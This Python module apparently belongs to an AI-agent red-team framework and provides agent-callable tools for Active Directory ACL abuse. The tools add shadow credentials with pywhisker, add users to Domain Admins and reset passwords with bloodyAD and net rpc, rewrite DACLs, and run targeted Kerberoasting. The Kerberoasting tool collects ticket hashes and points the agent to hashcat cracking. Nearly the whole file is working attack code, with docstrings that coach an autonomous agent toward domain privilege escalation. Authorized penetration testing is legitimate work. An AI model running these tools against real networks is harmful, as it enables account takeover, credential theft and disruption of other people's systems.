"""Red Team ACL exploitation tools.

This module provides toolsets for exploiting Active Directory
ACL misconfigurations (GenericAll, GenericWrite, WriteDacl, etc.)
"""

import logging
import re

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset

from ares.core.models import Hash
from ares.tools.red.common import (
    AnyRedTeamState,
    run_tool,
)

logger = logging.getLogger(__name__)


class ACLExploitTools(Toolset):
    """Tools for exploiting Active Directory ACL misconfigurations.

    When BloodHound identifies GenericAll, GenericWrite, WriteDacl, or WriteOwner
    permissions, use these tools to exploit them.
    """

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def pywhisker(
        self,
        target_samaccountname: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        action: str = "add",
    ) -> str:
        """
        Add/remove shadow credentials for privilege escalation.

        Shadow credentials abuse msDS-KeyCredentialLink to add attacker-controlled
        keys, enabling PKINIT authentication without knowing the password.

        Use when you have GenericAll or GenericWrite on a user/computer.

        Args:
            target_samaccountname: Target account to add shadow creds to
            domain: Target domain
            username: Your username with GenericAll/GenericWrite
            password: Your password
            dc_ip: Domain controller IP
            action: "add" to add shadow creds, "list" to view, "remove" to clean up

        Returns:
            Shadow credentials result (includes PFX path if successful)

        Example:
            >>> pywhisker("Administrator", "domain.local", "user", "pass", "192.168.56.10")
        """
        cmd = [
            "pywhisker.py",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            password,
            "--target",
            target_samaccountname,
            "--action",
            action,
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Running pywhisker against {target_samaccountname} ({action})")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if ".pfx" in result.lower() or "saved" in result.lower():
                logger.info("[+] Shadow credentials added! Use certipy_auth with the PFX file.")
                result = (
                    "\ud83d\udea8 SHADOW CREDENTIALS ADDED!\n"
                    "\u2192 Use certipy_auth with the generated PFX file to get NTLM hash\n\n"
                    + result
                )

            return result

        except Exception as e:
            return f"Pywhisker failed: {e}"

    @dn.tool_method
    def bloodyad_add_group_member(
        self,
        target_user: str,
        group: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Add a user to a group via ACL abuse (bloodyAD).

        Use when you have GenericAll, GenericWrite, or WriteMember on a group.
        Add yourself or a controlled user to Domain Admins or other privileged groups.

        Args:
            target_user: User to add to the group
            group: Target group (e.g., "Domain Admins")
            domain: Target domain
            username: Your username with write access
            password: Your password
            dc_ip: Domain controller IP

        Returns:
            Group modification result

        Example:
            >>> bloodyad_add_group_member("controlled_user", "Domain Admins", "domain.local", "user", "pass", "192.168.56.10")
        """
        cmd = [
            "bloodyAD",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            password,
            "--host",
            dc_ip,
            "add",
            "groupMember",
            group,
            target_user,
        ]

        try:
            logger.info(f"[*] Adding {target_user} to {group} via bloodyAD")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "added" in result.lower():
                logger.info(f"[+] Successfully added {target_user} to {group}!")
                result = f"\u2705 {target_user} added to {group}!\n" + result

            return result

        except Exception as e:
            return f"bloodyAD failed: {e}"

    @dn.tool_method
    def bloodyad_set_password(
        self,
        target_user: str,
        new_password: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Reset a user's password via ACL abuse (bloodyAD).

        Use when you have GenericAll, GenericWrite, or ForceChangePassword on a user.
        Allows setting a known password without knowing the original.

        Args:
            target_user: User whose password to reset
            new_password: New password to set
            domain: Target domain
            username: Your username with write access
            password: Your password
            dc_ip: Domain controller IP

        Returns:
            Password reset result

        Example:
            >>> bloodyad_set_password("admin_user", "NewP@ssw0rd!", "domain.local", "user", "pass", "192.168.56.10")
        """
        cmd = [
            "bloodyAD",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            password,
            "--host",
            dc_ip,
            "set",
            "password",
            target_user,
            new_password,
        ]

        try:
            logger.info(f"[*] Resetting password for {target_user} via bloodyAD")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "changed" in result.lower():
                logger.info(f"[+] Password for {target_user} reset successfully!")
                result = (
                    f"\u2705 Password reset for {target_user}!\n"
                    f"\u2192 New credential: {target_user}:{new_password}\n"
                    f"\u2192 Use domain_admin_checker with new creds\n\n" + result
                )

            return result

        except Exception as e:
            return f"bloodyAD failed: {e}"

    @dn.tool_method
    def force_change_password(
        self,
        target_user: str,
        new_password: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Force change a user's password via ForceChangePassword ACL (net rpc).

        Alternative to bloodyad_set_password using rpcclient/net rpc.
        Use when you have ForceChangePassword permission on a user.

        **WARNING**: This is disruptive - the user's real password changes!

        Args:
            target_user: User whose password to reset
            new_password: New password to set
            domain: Target domain
            username: Your username with ForceChangePassword permission
            password: Your password
            dc_ip: Domain controller IP

        Returns:
            Password change result

        Example:
            >>> force_change_password("victim_user", "NewP@ss123!", "domain.local", "attacker", "pass", "192.168.56.10")
        """
        cmd = [
            "net",
            "rpc",
            "password",
            target_user,
            new_password,
            "-U",
            f"{domain}/{username}%{password}",
            "-S",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Force changing password for {target_user}")
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if returncode == 0 or "success" in result.lower():
                logger.info(f"[+] Password for {target_user} changed successfully!")
                result = (
                    f"\u2705 Password changed for {target_user}!\n"
                    f"\u2192 New credential: {target_user}:{new_password}\n"
                    f"\u2192 Test with domain_admin_checker immediately\n\n" + result
                )

            return result

        except Exception as e:
            return f"Force password change failed: {e}"

    @dn.tool_method
    def dacl_edit(
        self,
        target_dn: str,
        principal: str,
        rights: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        action: str = "write",
    ) -> str:
        """
        Modify DACL permissions on AD objects (dacledit.py).

        Use when you have WriteDacl permission. Grant yourself additional rights
        to enable further attacks (e.g., grant GenericAll to perform shadow creds).

        Args:
            target_dn: Distinguished name of target object
            principal: User/group to grant rights to
            rights: Rights to grant ('FullControl', 'GenericAll', 'GenericWrite', 'WriteMembers')
            domain: Target domain
            username: Your username with WriteDacl permission
            password: Your password
            dc_ip: Domain controller IP
            action: 'write' to add, 'remove' to delete permissions

        Returns:
            DACL modification result

        Example:
            >>> dacl_edit("CN=Domain Admins,CN=Users,DC=domain,DC=local", "attacker", "GenericAll", "domain.local", "user", "pass", "192.168.56.10")
        """
        cmd = [
            "dacledit.py",
            "-action",
            action,
            "-rights",
            rights,
            "-principal",
            principal,
            "-target-dn",
            target_dn,
            f"{domain}/{username}:{password}",
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Modifying DACL on {target_dn}: granting {rights} to {principal}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "modified" in result.lower():
                logger.info("[+] DACL modified successfully!")
                result = (
                    f"\u2705 DACL modified: {principal} now has {rights} on target!\n"
                    "\u2192 Use new permissions for further exploitation\n\n" + result
                )

            return result

        except Exception as e:
            return f"DACL edit failed: {e}"

    @dn.tool_method
    def targeted_kerberoast(
        self,
        target_user: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Perform targeted Kerberoasting by adding an SPN to a user (GenericWrite abuse).

        When you have GenericWrite on a user, you can add an SPN and then Kerberoast them.
        This allows cracking the password of any user you have GenericWrite on.

        Attack chain: Add SPN -> Request TGS -> Crack offline -> Remove SPN

        Args:
            target_user: User to add SPN to and Kerberoast
            domain: Target domain
            username: Your username with GenericWrite
            password: Your password
            dc_ip: Domain controller IP

        Returns:
            Kerberoast hash for the target user

        Example:
            >>> targeted_kerberoast("high_value_user", "domain.local", "attacker", "pass", "192.168.56.10")
        """
        cmd = [
            "targetedKerberoast.py",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            password,
            "--dc-ip",
            dc_ip,
            "-t",
            target_user,
        ]

        try:
            logger.info(f"[*] Performing targeted Kerberoast on {target_user}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "$krb5tgs$" in result:
                logger.info("[+] Targeted Kerberoast successful - hash obtained!")
                if self.state:
                    matches = re.findall(r"(\$krb5tgs\$[^\s]+)", result)
                    for value in matches:
                        username_value = "Unknown"
                        domain_value = ""
                        parts = value.split("$")
                        if len(parts) >= 5:
                            user_part = parts[3].lstrip("*")
                            realm_part = parts[4]
                            if user_part:
                                username_value = user_part
                            if realm_part:
                                domain_value = realm_part
                        hash_obj = Hash(
                            username=username_value,
                            hash_value=value,
                            hash_type="Kerberos",
                            domain=domain_value or domain,
                        )
                        if hasattr(self.state, "add_hash"):
                            self.state.add_hash(hash_obj, "targeted_kerberoast")
                        else:
                            self.state.hashes.append(hash_obj)
                result = (
                    f"\ud83d\udea8 KERBEROAST HASH OBTAINED FOR {target_user}!\n"
                    "\u2192 Use crack_with_hashcat with mode 13100 to crack\n"
                    "\u2192 SPN will be automatically cleaned up\n\n" + result
                )

            return result

        except Exception as e:
            return f"Targeted Kerberoast failed: {e}"
